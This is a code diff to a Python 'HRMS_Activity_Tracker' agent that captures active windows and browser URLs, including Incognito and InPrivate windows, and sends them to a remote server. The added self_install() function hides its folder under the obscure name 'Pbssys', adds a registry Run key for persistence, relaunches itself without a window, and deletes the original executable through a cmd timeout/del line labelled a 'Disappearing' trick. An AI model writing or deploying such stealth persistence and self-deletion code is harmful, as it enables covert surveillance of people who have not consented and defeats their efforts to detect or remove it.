@@ -27,7 +27,7 @@ except ImportError:
     pass  # Bundled in EXE
 
 # ──────────────────────────────────────────────
-#  CONFIGURATION  (overwritten by config.json)
+#  CONFIGURATION  (overwritten by config.json or Filename)
 # ──────────────────────────────────────────────
 SERVER_URL = "https://petabytzglobal.com/activity-tracking/api/sync/"
 API_TOKEN = ""
@@ -36,9 +36,31 @@ APP_NAME = "HRMS_Activity_Tracker"
 # Resolve the directory this EXE / script lives in
 if getattr(sys, "frozen", False):
     BASE_DIR = os.path.dirname(sys.executable)
+    EXE_FILE = sys.executable
 else:
     BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+    EXE_FILE = os.path.abspath(__file__)
 
+# 1. Try to get config from filename (Personalized Installer Trick)
+# Format: ActivityTracker_TOKEN_HOST_PORT.exe
+exe_name = os.path.basename(EXE_FILE)
+if "_" in exe_name:
+    parts = exe_name.replace(".exe", "").split("_")
+    if len(parts) >= 3:
+        # Example: ActivityTracker_T123_localhost_8000.exe
+        API_TOKEN = parts[1]
+        host_part = parts[2].replace("-", ".")
+
+        # Check if port is included
+        if len(parts) >= 4:
+            port = parts[3]
+            host_part = f"{host_part}:{port}"
+
+        # Determine protocol
+        protocol = "http" if "localhost" in host_part or "127.0.0.1" in host_part else "https"
+        SERVER_URL = f"{protocol}://{host_part}/activity-tracking/api/sync/"
+
+# 2. Try to get config from config.json (Installed version)
 config_path = os.path.join(BASE_DIR, "config.json")
 if os.path.exists(config_path):
     try:
@@ -88,27 +110,65 @@ def hide_console():
 # ──────────────────────────────────────────────
 #  BROWSER / APP TRACKING
 # ──────────────────────────────────────────────
-def get_browser_url(app_name):
-    """Deep-extract the current URL using UI Automation."""
+def get_browser_url(app_name, active_title):
+    """Deep-extract the current URL using UI Automation (Supports Chrome, Edge, Brave, Firefox)."""
     if sys.platform != "win32":
         return None
     app_lower = app_name.lower()
     if not any(b in app_lower for b in ["chrome", "msedge", "firefox", "brave"]):
         return None
+
     try:
-        browser = auto.WindowControl(ClassName="Chrome_WidgetWin_1", NameRe=".*(Google Chrome|Microsoft Edge|Brave).*")
+        # Use the active window title to find the specific browser window
+        # We escape special regex characters in the title for safety
+        import re
+
+        safe_title = re.escape(active_title)
+        browser = auto.WindowControl(NameRe=f".*{safe_title}.*")
+
         if not browser.Exists(0):
-            browser = auto.WindowControl(ClassName="MozillaWindowClass")
+            # Fallback to general search if title-specific fails
+            browser = auto.WindowControl(
+                ClassName="Chrome_WidgetWin_1", NameRe=".*(Google Chrome|Microsoft Edge|Brave|Incognito|InPrivate).*"
+            )
+            if not browser.Exists(0):
+                browser = auto.WindowControl(ClassName="MozillaWindowClass")
+
         if not browser.Exists(0):
             return None
-        address_bar = browser.EditControl(Name="Address and search bar")
-        if not address_bar.Exists(0):
-            address_bar = browser.EditControl(Name="App")
-        if address_bar.Exists(0):
+
+        # Try common address bar identifiers
+        address_bar = None
+        # Chrome/Edge usually use these
+        for name in ["Address and search bar", "Address bar", "URL", "App", "Address"]:
+            ctrl = browser.EditControl(Name=name)
+            if ctrl.Exists(0):
+                address_bar = ctrl
+                break
+
+        # Firefox fallback
+        if not address_bar and "firefox" in app_lower:
+            # Firefox often uses a specific structure
+            address_bar = browser.EditControl(AutomationId="urlbar-input")
+            if not address_bar.Exists(0):
+                address_bar = browser.EditControl(Name="Search with Google or enter address")
+
+        # Ultimate fallback: search children for a URL-like value
+        if not address_bar:
+            for ctrl in browser.GetChildren():
+                if ctrl.ControlType == auto.ControlType.EditControl:
+                    val = ctrl.GetValuePattern().Value
+                    if val and ("." in val or "localhost" in val) and " " not in val:
+                        address_bar = ctrl
+                        break
+
+        if address_bar:
             url = address_bar.GetValuePattern().Value
-            if url and not url.startswith("http"):
-                url = "https://" + url
-            return url
+            if url:
+                url = url.strip()
+                if url and not url.startswith("http") and "." in url:
+                    url = "https://" + url
+                return url
     except Exception:
         pass
     return None
@@ -418,7 +478,7 @@ def main():
             app_name, title = get_active_window_info()
 
             # 2. Extract URL and Search details for Browsers
-            url = get_browser_url(app_name)
+            url = get_browser_url(app_name, title)
             search_query, domain = parse_search_query(title, app_name, url)
 
             start_time = datetime.utcnow().isoformat() + "Z"
@@ -504,6 +564,75 @@ def main():
             time.sleep(10)  # avoid hard-crash loop
 
 
+def self_install():
+    """
+    Ensures the agent is installed in %LOCALAPPDATA% and registered for startup.
+    """
+    try:
+        app_name = "Pbssys"
+        base_dir = os.path.join(os.environ.get("LOCALAPPDATA", ""), app_name)
+        exe_name = "Pbssys.exe"
+        target_path = os.path.join(base_dir, exe_name)
+        config_path = os.path.join(base_dir, "config.json")
+
+        current_exe = sys.executable
+        if not getattr(sys, "frozen", False):
+            return  # Don't self-install if running as script
+
+        # 1. Create the base directory if it doesn't exist
+        if not os.path.exists(base_dir):
+            os.makedirs(base_dir)
+            # Hide the folder
+            if sys.platform == "win32":
+                import subprocess
+
+                subprocess.run(["attrib", "+h", base_dir], creationflags=subprocess.CREATE_NO_WINDOW)
+
+        # 2. If we aren't running from the target path, we are in "Installer Mode"
+        if os.path.normpath(current_exe).lower() != os.path.normpath(target_path).lower():
+            import contextlib
+            import shutil
+            import subprocess
+
+            # Save the current config (possibly from filename) to the permanent config.json
+            with open(config_path, "w") as f:
+                json.dump({"server_url": SERVER_URL, "api_token": API_TOKEN}, f)
+
+            # Copy file to permanent location
+            with contextlib.suppress(Exception):
+                shutil.copy2(current_exe, target_path)
+
+            # Add to startup registry
+            try:
+                import winreg
+
+                key = winreg.OpenKey(
+                    winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE
+                )
+                winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, f'"{target_path}"')
+                winreg.CloseKey(key)
+            except Exception:
+                pass
+
+            # Start the installed version
+            subprocess.Popen([target_path], creationflags=subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0)
+
+            # ──────────────────────────────────────────────────────────
+            # SELF-DELETION TRICK (The "Disappearing" part)
+            # ──────────────────────────────────────────────────────────
+            # We use a batch command that waits, deletes this file, and exits.
+            if sys.platform == "win32":
+                delete_cmd = f'timeout /t 2 >nul & del /f /q "{current_exe}"'
+                subprocess.Popen(f"cmd /c {delete_cmd}", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+
+            sys.exit(0)
+    except Exception:
+        pass
+
+
 if __name__ == "__main__":
-    if API_TOKEN:
-        main()
+    # 1. Perform self-installation and persistence
+    self_install()
+
+    # 2. Start the tracking loop
+    main()
